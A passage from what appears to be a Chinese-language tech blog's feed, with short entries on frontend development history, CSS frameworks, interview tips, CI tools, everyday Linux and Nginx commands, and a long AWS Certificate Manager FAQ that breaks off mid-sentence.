        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><ul><li>开发模式<ul><li>多页面开发 前端开发人员切页面然后和后端开发语言模板系统集成比如（PHP、JSP、EJS、JADE），后端进行渲染，前后端不分离，输出为JS、HTML、CSS等，前端开发可以对JS、CSS进行压缩或其他处理</li><li>单页面开发 使用富前端开发思想，后端只需要提供一个入口的页面和API，前端负责路由和渲染。前后端分离，前端一般会对资源进行打包，然后输出一个index.html 和 app.js,前端完成所有的业务逻辑和API调用。</li></ul></li></ul><ul><li><p>前端发展过程</p><ul><li>原生JS</li><li>JQuery + 插件开发模式，大规模的编写后台管理系统，easyUI</li><li>Backbone 的轻量级的MVC开发模式</li></ul></li><li><p>开发模式</p><ul><li><p>MVC 前端变成了一个application，index.html 入口启动, </p><ul><li>M model 一个可以操作的数据实体</li><li>V view 显示层，把数据渲染在页面上</li><li>C controller/collect 控制器</li><li>代表的框架：Backbone</li></ul></li><li><p>MVVM 解决了前端数据输入和输出映射问题</p><ul><li>M model</li><li>V 视图</li><li>MV-VM 意义是数据渲染到视图中，然后也可以从视图中获取数据，这就是双向绑定</li><li>代表框架：Angularjs </li></ul></li><li><p>单项数据流+渲染引擎</p><ul><li>React 是什么？React只是一个单项的高效的渲染引擎而已</li><li>我们讲React的时候往往在谈论React+Redux一套完整的开发生态</li><li>React/VUE</li></ul></li></ul></li><li><p>前端构建工具</p><ul><li>Node 前端开发为什么需要用Node？Node只是提供了一个JS的非浏览器运行环境（采用了chrome的V8引擎）。</li><li>Npm 一个nodejs 包管理工具和平台，NPM可以用来管理JS的依赖和包，NPM就可以安装大量的前端开发工具，NPM的描述文件为package.json<ul><li>npm install 安装当前目录下package.json 中所有的依赖</li></ul></li><li><p>构建工具</p><ul><li><p>grunt 提供了一个流处理工作环境，用来编写前端批处理任务，比如压缩JS、编译less、Sass等</p><ul><li>grunt的描述文件为Gruntfile.js</li><li>grunt的工作方式为通过编写gruntfile来组合grunt插件完成相应任务</li><li>grunt 常用插件<ul><li>requirejs 如果前端使用了模块化可以加载此类插件</li><li>uglify  </li><li>css_import 多个css组合成一个</li><li>cssmin 把css压缩成小文件</li><li>jshint 根据某种规则对JS代码检查</li></ul></li><li>一个例子项目 <a href="https://github.com/linksgo2011/backbone-weui" target="_blank" rel="noopener">https://github.com/linksgo2011/backbone-weui</a></li></ul></li><li><p>gulp 思路和grunt一致，但是gulp不仅提供了配置的方法，还可以交互式进行编程</p></li><li>webpack 资源的load和打包，webpack主要对单页面应用开发使用<ul><li>通过loader的思想，对前端资源进行管理和打包操作</li><li>Babel</li><li>Es6</li><li>Eslint</li></ul></li></ul></li></ul></li><li><p>React 生态</p><ul><li>Reactjs</li><li>React-router</li><li>Redux</li><li>React form </li><li>axios</li><li>工具<ul><li>lodash</li><li>moment</li></ul></li><li>webpack 配置</li><li>组件库 <a href="http://ant.design/" target="_blank" rel="noopener">http://ant.design/</a></li></ul></li><li><p>Vue 生态</p></li><li><p>前端的模块化历史</p><ul><li>没有模块化的时候<ul><li>命名空间放置变量作用于泄露 app.xx.fun1 = function(){}</li></ul></li><li>Requirejs</li><li>commonjs</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS样式框架选型</title>
      <link href="/collection/frontend%20boilderplate/"/>
      <url>/collection/frontend%20boilderplate/</url>
      
        <content type="html"><![CDATA[<p>浏览器样式重置基本样式<br><a href="http://necolas.github.io/normalize.css/" target="_blank" rel="noopener">http://necolas.github.io/normalize.css/</a></p><p>simple, responsive boilerplate.<br><a href="http://getskeleton.com/" target="_blank" rel="noopener">http://getskeleton.com/</a></p><p>推荐使用，简单纯净易于修改，适用于定制性更强的项目</p><p>frozenui 腾讯出品</p><p><a href="http://frozenui.github.io/" target="_blank" rel="noopener">http://frozenui.github.io/</a></p><p>妹子UI，中国版的bootstrap<br><a href="http://amazeui.org/" target="_blank" rel="noopener">http://amazeui.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> collection </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端面试tips</title>
      <link href="/frontend/frontend/Interview%20for%20frontend/"/>
      <url>/frontend/frontend/Interview%20for%20frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="面试考察目标"><a href="#面试考察目标" class="headerlink" title="面试考察目标"></a>面试考察目标</h2><ul><li>对于编程语言的掌握程度，比如基本语法，语言特性等等</li><li>实际动手写代码的速度，比如敲代码过程中是否流畅</li><li>Code Smell的识别与重构能力</li><li>对于软件设计的理解深度</li><li>对遇到问题的解决思路以及反应速度</li><li>对新需求的反应和理解速度</li><li>对新事物的态度和学习能力，比如新IDE，TDD等</li><li>沟通交流、协作能力</li><li>对待Feedback的态度</li></ul><h2 id="面试准备"><a href="#面试准备" class="headerlink" title="面试准备"></a>面试准备</h2><ol><li>作业查看</li><li>收集上一轮面试反馈</li><li>关键信息收集<ul><li>姓名</li><li>技术栈</li><li>工作年限</li><li>项目经历</li><li>毕业院校</li></ul></li></ol><h2 id="准备问题的几个维度"><a href="#准备问题的几个维度" class="headerlink" title="准备问题的几个维度"></a>准备问题的几个维度</h2><ol><li>理论基础</li><li>常用编程技巧是否熟练</li><li>接受Feedback和沟通是否顺畅</li><li>学习能力</li><li>发现问题能力</li><li>工程设计能力</li><li>细节和质量控制能力</li></ol><h2 id="几个可选的问题"><a href="#几个可选的问题" class="headerlink" title="几个可选的问题"></a>几个可选的问题</h2><ol><li>工作中是否使用了ES6那些语法特性?</li><li>了解哪些前端框架和库，他们的特点是什么？</li><li>你觉得这里用xxx是不是好一些？</li><li>如果你拿到一个新的框架，会怎么去快速上手？</li><li>对于你的代码，你觉得哪些点还可以提升？</li><li>这些逻辑是不是可以抽象出来？</li><li>怎么写单元测试？</li></ol>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>英语语法的内在逻辑</title>
      <link href="/architecture/english/English%20grammar/"/>
      <url>/architecture/english/English%20grammar/</url>
      
        <content type="html"><![CDATA[<p>在语言世界中，语法不是公式，而仅仅是规律。</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>免费的CI/CD 工具</title>
      <link href="/CI/engineered/CI-free-tools/"/>
      <url>/CI/engineered/CI-free-tools/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要使用CI"><a href="#为什么要使用CI" class="headerlink" title="为什么要使用CI?"></a>为什么要使用CI?</h3><p>方便集成发布和包管理,举个例子就是在Merge PR之前运行测试,如果测试没有通过,不允许合并代码。</p><h3 id="能和Github集成的CI工具"><a href="#能和Github集成的CI工具" class="headerlink" title="能和Github集成的CI工具"></a>能和Github集成的CI工具</h3><p><a href="https://github.com/marketplace/category/continuous-integration" target="_blank" rel="noopener">https://github.com/marketplace/category/continuous-integration</a></p><p>Travis CI<br>CircleCI 推荐使用</p><h3 id="Github-flow"><a href="#Github-flow" class="headerlink" title="Github flow"></a>Github flow</h3><p>关键点</p><ul><li>代码质量</li><li>代码安全扫描</li><li>报警</li><li>包管理</li><li>自动部署和发布</li><li>代码审查</li></ul><p><a href="https://help.github.com/articles/github-flow/" target="_blank" rel="noopener">https://help.github.com/articles/github-flow/</a></p><p>使用github开发步骤</p><ul><li>Create a branch from the repository.</li><li>Create, edit, rename, move, or delete files.</li><li>Send a pull request from your branch with your proposed changes to kick off a discussion.</li><li>Make changes on your branch as needed. Your pull request will update automatically.</li><li>Merge the pull request once the branch is ready to be merged.</li><li>Tidy up your branches using the delete button in the pull request or on the branches page.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CI </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最实用的Linux命令</title>
      <link href="/devops/devops/%E6%9C%80%E5%AE%9E%E7%94%A8%E7%9A%84linux%E5%91%BD%E4%BB%A4/"/>
      <url>/devops/devops/%E6%9C%80%E5%AE%9E%E7%94%A8%E7%9A%84linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>查看操作系统信息</p><blockquote><p>head -n 1 /etc/issue</p></blockquote><p>install JDK8 in ubuntu 14.04</p><p>Add the webupd8 ppa, and install from that -</p><blockquote><p>sudo add-apt-repository ppa:webupd8team/java</p></blockquote><blockquote><p>sudo apt-get update</p></blockquote><blockquote><p>sudo apt-get install oracle-java8-installer</p></blockquote><p>Then</p><blockquote><p>java -version</p></blockquote><p>should show you using Oracle Java 8. If not, or if you want to use a different version - run update-java-alternatives with something like,</p><blockquote><p>sudo update-java-alternatives -s java-8-oracle</p></blockquote><p>or</p><blockquote><p>sudo update-java-alternatives -s java-7-oracle</p></blockquote><p>As appropriate.</p><p>Got the error: apt-get-repository Command is Missing</p><p>fixed by</p><blockquote><p>sudo apt-get update</p></blockquote><blockquote><p>sudo apt-get install software-properties-common</p></blockquote><p><a href="https://stackoverflow.com/questions/25549492/install-jdk8-in-ubuntu-14-04" target="_blank" rel="noopener">https://stackoverflow.com/questions/25549492/install-jdk8-in-ubuntu-14-04</a></p><p>打包备份</p><blockquote><p>tar -zcvf “jiaonuobg_assets_$(date “+%Y%m%d”).tar.gz” jiaonuobg/assets</p></blockquote><p>备份nodejs+mysql项目</p><p>TBC</p><p>Maven wrapper 生成</p><blockquote><p>mvn -N io.takari:maven:wrapper</p></blockquote><p>根据端口查询Linux PID</p><blockquote><p>netstat -apn | grap $port</p></blockquote><p>从字符串中提取数字，例如PID</p><blockquote><p>output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ }<br>echo $num5</p></blockquote><p>让进程在后台执行</p><blockquote><p>java -jar package.jar &amp;</p></blockquote><p>执行一段Linux命令并给变量赋值</p><blockquote><p>output=$(netstat -apn | grep 8086 | sed ‘s/[0-9]*//g’)<br>echo $output</p></blockquote><p>查看服务器内存用量</p><blockquote><p>sudo free</p></blockquote><p>查看服务器磁盘用量</p><blockquote><p>sudo df -h</p></blockquote><p>Git 增加文件执行权限</p><blockquote><p>git update-index –chmod=+x $script</p></blockquote><p>查看sudo 环境下有哪些可用的权限</p><blockquote><p>sudo -l</p></blockquote><p>搜索文件相关</p><p>当前文件目录下搜索</p><blockquote><p>grep -RI ‘keyword’  .  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Gradle 基本使用指南</title>
      <link href="/devops/devops/gradle/"/>
      <url>/devops/devops/gradle/</url>
      
        <content type="html"><![CDATA[<p>命令行界面</p><p><a href="https://docs.gradle.org/current/userguide/command_line_interface.html" target="_blank" rel="noopener">https://docs.gradle.org/current/userguide/command_line_interface.html</a></p><p>生成 wrapper 文件</p><blockquote><p>gradle wrapper </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>系统监控和维护</title>
      <link href="/devops/devops/monitors%20for%20website/"/>
      <url>/devops/devops/monitors%20for%20website/</url>
      
        <content type="html"><![CDATA[<h2 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h2><pre><code>- 查看日志文件命令    - cat 快速显示文件    - more less 分页查找    - tail 显示文件尾    - head 显示文件头    - sort 内容排序    - wc 字符统计 wc 为Word count的缩写    - uniq 去重连续的重复行 </code></pre>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx 常用操作</title>
      <link href="/devops/devops/nginx%20usful%20command/"/>
      <url>/devops/devops/nginx%20usful%20command/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Nginx"><a href="#什么是Nginx" class="headerlink" title="什么是Nginx"></a>什么是Nginx</h1><p>Nginx是一个优秀的web服务器，同时也可以用作负载均衡和反向代理 </p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在Ubuntu的环境下，安装Nginx</p><blockquote><p>apt-get install nginx</p></blockquote><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>配置修改后不停服重载</p><blockquote><p>service nginx reload</p></blockquote><p>停服重启</p><blockquote><p>service nginx start</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Nginx的配置文件位于</p><p><code>/etc/nginx</code></p><p>配置文件入口为 nginx.conf，其中定义了全局的配置文件，包括日志位置、gzip、邮件以及加载站点的等配置。</p><p>我们常用的站点信息配置在：</p><p>/etc/nginx/sites-enabled/*;</p><h3 id="一个默认的配置文件"><a href="#一个默认的配置文件" class="headerlink" title="一个默认的配置文件"></a>一个默认的配置文件</h3><p><code></code><br>server {<br>    listen 80 default_server;<br>    listen [::]:80 default_server ipv6only=on;</p><pre><code># 资源根目录root /var/www;# 主页index index.html index.htm index.php ;# Make site accessible from http://localhost/server_name localhost;location / {    # First attempt to serve request as file, then    # as directory, then fall back to displaying a 404.    try_files $uri $uri/ =404;    # Uncomment to enable naxsi on this location    # include /etc/nginx/naxsi.rules}# 配置反向代理 例如 host/sub-path -&gt; http://127.0.0.1:8080; # Only for nginx-naxsi used with nginx-naxsi-ui : process denied requests#location /RequestDenied {#    proxy_pass http://127.0.0.1:8080;    #}#error_page 404 /404.html;# redirect server error pages to the static page /50x.html##error_page 500 502 503 504 /50x.html;#location = /50x.html {#    root /usr/share/nginx/html;#}# 开启PHP 解析# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \.php$ {    fastcgi_split_path_info ^(.+\.php)(/.+)$;    # NOTE: You should have &quot;cgi.fix_pathinfo = 0;&quot; in php.ini    # With php5-cgi alone:    fastcgi_pass 127.0.0.1:9000;    # With php5-fpm:    fastcgi_pass unix:/var/run/php5-fpm.sock;    fastcgi_index index.php;    include fastcgi_params;}# deny access to .htaccess files, if Apache&apos;s document root# concurs with nginx&apos;s one##location ~ /\.ht {#    deny all;#}</code></pre><p>}</p><p><code></code></p><h3 id="Nginx-解析PHP的原理"><a href="#Nginx-解析PHP的原理" class="headerlink" title="Nginx 解析PHP的原理"></a>Nginx 解析PHP的原理</h3><p>Nginx发送请求到php-fpm进程，然后php-fpm解析后返回给Nginx，即HTTP协议处理为Nginx完成，php-fpm作为后台服务解析PHP页面</p><h3 id="Nginx-增加虚拟主机方法"><a href="#Nginx-增加虚拟主机方法" class="headerlink" title="Nginx 增加虚拟主机方法"></a>Nginx 增加虚拟主机方法</h3><blockquote><p>mv default v-host</p></blockquote><blockquote><p>vim v-host</p></blockquote><p>然后修改 v-host 文件中server_name为站点域名，讲该域名DNS指向本机即可</p><p>然后重在或者重启Nginx服务器 </p><blockquote><p>service nginx restart<br>查看服务器装填<br>service nginx status</p></blockquote><p>如果服务器重启有误或者无效，可以在nginx.info 中找到日志文件查看并修改</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>AWS Certificate Manager 常见问题</title>
      <link href="/aws/devops/aws-certificate-manager-faqs/"/>
      <url>/aws/devops/aws-certificate-manager-faqs/</url>
      
        <content type="html"><![CDATA[<h3 id="一般性问题"><a href="#一般性问题" class="headerlink" title="一般性问题"></a>一般性问题</h3><p>问：什么是 AWS Certificate Manager (ACM)？</p><p>AWS Certificate Manager 是一项服务，可帮助您轻松地预置、管理和部署用于 AWS 服务的安全套接字层/传输层安全性 (SSL/TLS) 证书。SSL/TLS 证书用于保护网络通信的安全并确立网站在 Internet 上的身份。使用 AWS Certificate Manager，您无需再为购买、上传和更新 SSL/TLS 证书而经历耗时的手动流程。利用 AWS Certificate Manager，您可以快速请求证书，在 AWS 资源 (如 Amazon API Gateway 上的 Elastic Load Balancer、Amazon CloudFront 分配或 API) 上部署该证书，并让 AWS Certificate Manager 处理证书更新事宜。通过 AWS Certificate Manager 预置的 SSL/TLS 证书可免费使用。您只需为您创建的用于运行应用程序的 AWS 资源付费。</p><p>问：什么是 SSL/TLS 证书？</p><p>SSL/TLS 证书使 Web 浏览器能够标识使用安全套接字层/传输层安全性 (SSL/TLS) 协议的网站并与之建立加密的网络连接。证书在名为公有密钥基础设施 (PKI) 的加密系统中使用。通过 PKI，在双方都信任同一个第三方 (称为证书颁发机构) 的情况下，一方可以为使用证书的另一方确立身份。ACM 用户指南、概念和术语提供了其他背景信息和定义。</p><p>问：AWS Certificate Manager 有什么作用？</p><p>您可以请求并预置 SSL/TLS 证书，然后为使用 Elastic Load Balancing、Amazon CloudFront 或 Amazon API Gateway 的站点和应用程序部署这些证书。验证请求域的所有权并获得颁发的证书之后，您可以从 AWS 管理控制台的下拉列表中选择 SSL/TLS 证书并部署该证书。或者，您也可以使用 AWS 命令行界面 (CLI) 命令或 API 调用将 ACM 提供的证书部署到 AWS 资源。ACM 会为您管理证书更新和证书部署事宜。</p><p>问：使用 AWS Certificate Manager 有哪些优势？</p><p>借助 ACM，您可以更加轻松地为 AWS 平台上的网站或应用程序启用 SSL/TLS。ACM 免除了过去与使用 SSL/TLS 和管理 SSL/TLS 证书相关的大量手动流程。ACM 还可管理证书更新，从而帮助您避免因证书配置错误、撤销或过期而导致的停机。您可获得 SSL/TLS 保护并轻松管理证书。启用 SSL/TLS 有助于提高站点的搜索排名，并可帮助您满足传输数据加密的法规合规性要求。</p><p>当您使用 ACM 时，它会应用强加密和密钥管理最佳实践来确保证书私有密钥的安全。借助 ACM，您可以使用 AWS 管理控制台、AWS CLI 或 AWS Certificate Manager API 集中管理 AWS Certificate Manager 在 AWS 区域内提供的所有 SSL/TLS 证书。AWS Certificate Manager 集成了其他 AWS 服务，因此您可以请求 SSL/TLS 证书，然后通过 AWS 管理控制台、AWS CLI 命令或 API 调用为 Elastic Load Balancing 负载均衡器或 Amazon CloudFront 分配预置证书。</p><p>问：如何开始使用 ACM？</p><p>要开始使用 AWS Certificate Manager，请导航到 AWS 管理控制台中的“Certificate Manager”，然后使用向导输入站点的名称以请求 SSL/TLS 证书。您也可以使用 AWS CLI 或 API 请求证书。在 ACM 获得域所有者的批准并且系统颁发 SSL/TLS 证书后，您就可以将其用于与 ACM 集成的其他 AWS 资源了。您只需从 AWS 管理控制台的下拉列表中选择您要部署的 SSL/TLS 证书即可。或者，您也可以执行一个 AWS CLI 命令或调用一个 AWS API，将该证书与您的资源关联起来。AWS Certificate Manager 随后会将该证书部署到您选择的资源。有关请求和使用 AWS Certificate Manager 所提供证书的更多信息，请参阅《AWS Certificate Manager 用户指南》中的入门。</p><p>问：ACM 提供哪种类型的证书？</p><p>ACM 提供域验证 (DV) 证书，供终止 SSL/TLS 的网站和应用程序使用。有关 ACM 提供的证书的更多详细信息，请参阅证书特点。</p><p>问：我可以将 ACM 提供的证书用于哪些 AWS 服务？</p><p>您可以将 ACM 用于以下 AWS 服务：<br>• Elastic Load Balancing – 请参阅 Elastic Load Balancing 文档<br>• Amazon CloudFront – 请参阅 CloudFront 文档<br>• Amazon API Gateway – 请参阅 API Gateway 文档<br>• AWS Elastic Beanstalk – 请参阅 AWS Elastic Beanstalk 文档<br>问：ACM 提供的证书是否适合政府部门？</p><p>ACM 证书可能适合部分政府部门，而并非对所有政府部门均适合。请查看当地法律、规则和法规，以确定某个 ACM 证书是否适合。如有任何疑问，请访问 AWS Support 中心并创建案例。</p><p>问：ACM 在哪些区域提供？</p><p>请访问 AWS 全球基础设施页面，了解目前提供 AWS 服务的区域。要将 ACM 证书与 Amazon CloudFront 配合使用，您必须在美国东部 (弗吉尼亚北部) 区域申请或导入该证书。该区域内与 CloudFront 分配关联的 ACM 证书将被分发到为该分配配置的所有地理位置。</p><p>问：我是否可以在多个 AWS 区域使用同一证书？</p><p>这要取决于您目前使用的是 Elastic Load Balancing 还是 Amazon CloudFront。要在不同区域内针对同一站点 (具有相同的完全限定域名 (FQDN) 或 FQDN 集) 将某个证书与 Elastic Load Balancing 配合使用，您需要为计划使用证书的每个区域申请新证书。请注意，还需要针对新区域重新验证证书中的每个名称。要将 ACM 证书与 Amazon CloudFront 配合使用，您必须在美国东部 (弗吉尼亚北部) 区域申请该证书。该区域内与 CloudFront 分配关联的 ACM 证书将被分发到为该分配配置的所有地理位置。</p><p>问：是否可以在区域之间复制证书？</p><p>目前不可以。</p><p>问：如果同一域名我已拥有来自其他提供商的证书，我是否还能够使用 ACM 配置证书？</p><p>是。<br>问：我是否可以在 Amazon EC2 实例或自己的服务器上使用证书？</p><p>不可以。目前，ACM 提供的证书只能用于特定 AWS 服务。请参阅我可以将 ACM 提供的证书用于哪些 AWS 服务？</p><p>问：我能够通过 ACM 预置的证书数量是否有限制？</p><p>默认情况下，您可以在每个区域中为每个账户预置多达 100 个证书。通过 ACM 预置的每个证书最多可以拥有 10 个完全限定域名。您可以访问 AWS Support 中心请求增加上限。有关更多详细信息，请参阅 AWS 文档。</p><h3 id="预置证书"><a href="#预置证书" class="headerlink" title="预置证书"></a>预置证书</h3><p>问：如何预置 ACM 提供的证书？</p><p>您可以使用 AWS 管理控制台、AWS CLI 或 ACM API/SDK 进行预置。要使用 AWS 管理控制台，请导航到控制台的 ACM 部分，选择“Request a Certificate”，输入站点的域名，然后按照屏幕上的说明完成请求。如果用户可以通过其他名称访问您的站点，则可以在请求中添加其他域名。域的所有者会收到一封关于请求批准颁发证书的电子邮件。在请求中的所有域名获得域所有者的批准后，系统将颁发证书并准备好预置证书以用于其他 AWS 服务，如 Elastic Load Balancing 或 Amazon CloudFront。有关详细信息，请参阅 ACM 文档。<br>问：颁发证书需要多长时间？</p><p>获得域的所有者或域所有者授权代表的批准后，系统通常会在几分钟内颁发证书，但也可能需要更长时间。有关更多详细信息，请参阅如何预置 ACM 提供的证书？<br>问：请求证书时会发生什么情况？</p><p>为了验证您对请求的证书中包括的域名或名称的控制权，系统会针对证书请求中的每个域名向注册域的所有者发送电子邮件。在域的所有者或授权代表批准证书请求之前，证书请求将处于待验证状态。域的所有者或授权代表 (审批者) 可以按照电子邮件中的说明批准证书请求。说明将指引审批者导航到审批网站，单击电子邮件中的链接或将电子邮件中的链接粘贴到浏览器中，以导航到审批网站。审批者确认与证书请求相关的信息，如域名、证书 ID (ARN) 以及发出请求的 AWS 账户 ID，如果信息准确无误，则批准请求。在证书请求中的所有域名获得批准后，系统通常会在几分钟内颁发证书，届时证书请求的状态将变为已颁发。获得颁发的证书后，您便可以开始将其用于其他 AWS 服务。<br>问：审批请求要发送到哪个电子邮件地址？<br>当您请求证书时，系统会针对证书请求中的每个域名使用 WHOIS 查找来检索该域的联系人信息。电子邮件会发送至针对该域列出的域注册人、管理联系人和技术联系人。电子邮件还会同时发送至域的五个特定电子邮件地址，即在您请求的域名前加上 admin@、administrator@、hostmaster@、webmaster@ 和 postmaster@ 生成的五个地址。例如，如果您为 server.example.com 请求证书，系统将使用针对 example.com 域，外加 <a href="mailto:admin@server.example.com" target="_blank" rel="noopener">admin@server.example.com</a>、<a href="mailto:administrator@server.example.com" target="_blank" rel="noopener">administrator@server.example.com</a>、<a href="mailto:hostmaster@server.example.com" target="_blank" rel="noopener">hostmaster@server.example.com</a>、<a href="mailto:postmaster@server.example.com" target="_blank" rel="noopener">postmaster@server.example.com</a> 和 <a href="mailto:webmaster@server.example.com" target="_blank" rel="noopener">webmaster@server.example.com</a> 的 WHOIS 查询返回的联系人信息将电子邮件发送至域注册人、技术联系人和管理联系人。</p><p>针对以“www”开头的域名或以星号 (*) 开头的通配符名称，这五个特定电子邮件地址采用不同的构造方式。ACM 会删除前导的“www”或星号，而电子邮件则被发送到通过在域名其余部分之前加上 admin@、administrator@、hostmaster@、postmaster@ 和 webmaster@ 来构造的管理员地址。例如，如果您为 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 请求证书，则电子邮件被发送到 WHOIS 联系人 (如前所述) 以及 <a href="mailto:admin@example.com" target="_blank" rel="noopener">admin@example.com</a>，而不是 <a href="mailto:admin@www.example.com" target="_blank" rel="noopener">admin@www.example.com</a>。其余四个特定电子邮件地址也采用类似的方式构造。</p><p>请求证书之后，您可以使用 ACM 控制台、AWS CLI 或 API 查看针对各个域发送的电子邮件的收件方电子邮件地址列表。<br>问：我是否可以配置接收证书审批请求的电子邮件地址？</p><p>不可以，不过您可以配置用于接收验证电子邮件的基础域名。基础域名必须是证书请求中域名的超级域。例如，如果您想为 server.domain.example.com 请求证书，但希望将审批电子邮件发送至 <a href="mailto:admin@domain.example.com" target="_blank" rel="noopener">admin@domain.example.com</a>，则可以使用 AWS API 或 API 实现这一目的。有关更多详细信息，请参阅 ACM CLI 参考和 ACM API 参考。<br>问：我是否可以使用具有代理联系人信息 (例如 Privacy Guard 或 WhoisGuard) 的域？</p><p>可以；不过，电子邮件的发送可能会因为代理而延迟。通过代理发送的电子邮件可能会进入您的垃圾邮件文件夹。有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：ACM 是否可以通过我的 AWS 账户的技术联系人验证我的身份？</p><p>不可以。验证域所有者身份的流程和策略非常严格，并且由为公开可信的证书颁发机构设置策略标准的 CA/Browser Forum 决定。要了解详情，请参阅 Amazon Trust Services 存储库中最新的“Amazon Trust Services 认证规范声明”。<br>问：我的证书请求状态为什么是“待验证”？</p><p>已发出请求但未经过批准的证书的状态为待验证。域的所有者或授权代表必须批准证书请求，然后系统才能颁发证书。</p><p>问：如果我没有收到验证和批准电子邮件，该怎么做？</p><p>有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：我的证书请求状态为什么显示为“失败”？</p><p>有多种原因会导致域的验证控制流程失败，包括但不限于：网络资源的网址列表中包括的域被认定为包含恶意软件或欺诈性内容。要确定申请失败的原因，请访问 ACM 故障排除指南。</p><p>问：我的证书请求状态为什么显示为“验证超时”？</p><p>如果 ACM 证书请求在 72 小时内没有接受验证，则被视为超时。有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：是否有其他方法来验证域或审批支持的证书？</p><p>目前没有。</p><h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>问：浏览器、操作系统和移动设备是否信任 ACM 提供的证书？</p><p>目前的绝大部分浏览器、操作系统和移动设备都信任 ACM 提供的证书。ACM 提供的证书在浏览器和操作系统中的普及率高达 99%，包括 Windows XP SP3 和 Java 6 及更高版本。</p><p>问：如何确认我的浏览器是否信任 ACM 提供的证书？</p><p>信任 ACM 提供的证书的浏览器会显示一个锁形图标，并且在连接到使用 ACM 基于 SSL/TLS 提供的证书 (例如使用 HTTPS) 的站点时会显示不要颁发证书的警告。</p><p>ACM 提供的证书由亚马逊的证书颁发机构 (CA) 进行验证。任何包含 Amazon Root CA 1、Starfield Services Root Certificate Authority – G2 或 Starfield Class 2 Certification Authority 的浏览器、应用程序和操作系统均会信任由 ACM 提供的证书。</p><p>问：ACM 是否可以提供包括多个域名的证书？</p><p>可以。每个证书必须包括至少一个域名，并且您可以根据需要在证书中添加更多域名。例如，您可以将域名“<a href="http://www.example.net”添加到用于“www.example.com”的证书，前提是用户通过这两个域名都可以访问您的站点。对于证书请求中包括的所有名称，您必须具有所有权和控制权。" target="_blank" rel="noopener">www.example.net”添加到用于“www.example.com”的证书，前提是用户通过这两个域名都可以访问您的站点。对于证书请求中包括的所有名称，您必须具有所有权和控制权。</a></p><p>问：什么是通配符域名？</p><p>通配符域名匹配域中的所有第一级子域或主机名。第一级子域是一个不包含句号 (圆点) 的域名标签。例如，您可以使用名称“*.example.com”保护 <a href="http://www.example.com、images.example.com" target="_blank" rel="noopener">www.example.com、images.example.com</a> 以及以 .example.com 结尾的任何其他主机名或第一级子域。有关更多详细信息，请参阅 ACM 用户指南。</p><p>问：ACM 是否可以提供带有通配符域名的证书？</p><p>可以。</p><p>问：ACM 是否提供组织验证 (OV) 或扩展验证 (EV) 证书？</p><p>目前不提供。</p><p>问：ACM 是否为网站提供除 SSL/TLS 以外的其他类型的证书？</p><p>目前不提供。</p><p>问：我是否可以使用 ACM 提供的证书进行代码签名或电子邮件加密？</p><p>不可以。</p><p>问：ACM 是否提供用于签名和加密电子邮件的证书 (S/MIME 证书) ？</p><p>目前不提供。</p><p>问：ACM 提供的证书使用哪些算法？</p><p>ACM 证书使用的是采用 2048 位模数和 SHA-256 的 RSA 密钥。</p><p>问：ACM 是否支持椭圆曲线 (ECDSA) 证书？</p><p>目前不支持。<br>问：亚马逊在哪里介绍其关于颁发证书的策略和规范？</p><p>“Amazon Trust Services 证书策略”和“Amazon Trust Services 证书规范声明”文档中提供了相关信息。有关最新版本，请参阅 Amazon Trust Services 存储库。</p><p>问：如何撤销证书？</p><p>您可以访问 AWS Support 中心并创建案例，以请求 ACM 撤销证书。 </p><p>问：如果证书中的信息发生更改，我该如何通知 AWS？</p><p>您可以发送电子邮件至 validation-questions[at]amazon.com，通知 AWS。</p><p> </p><h3 id="私有密钥保护"><a href="#私有密钥保护" class="headerlink" title="私有密钥保护"></a>私有密钥保护</h3><p>问：ACM 提供的证书的私有密钥是如何管理的？</p><p>系统会为 ACM 提供的每个证书创建一个键前缀。AWS Certificate Manager 可保护并管理用于 SSL/TLS 证书的私有密钥。ACM 会运用强加密和密钥管理最佳实践来保护并存储私有密钥。</p><p>问：ACM 是否可以跨 AWS 区域复制证书？</p><p>不可以。每个 ACM 证书私有密钥均存储在您请求该证书的区域。例如，当您在弗吉尼亚北部区域获得新的证书后，ACM 会将私有密钥存储在弗吉尼亚北部区域。仅当 ACM 证书与 CloudFront 分配关联时，该证书才能跨区域复制。在这种情况下，CloudFront 会将 ACM 证书分配到为您的分配配置的地理位置。</p><p>问：我是否可以对证书私有密钥的使用进行审核？</p><p>可以。您可以使用 AWS CloudTrail 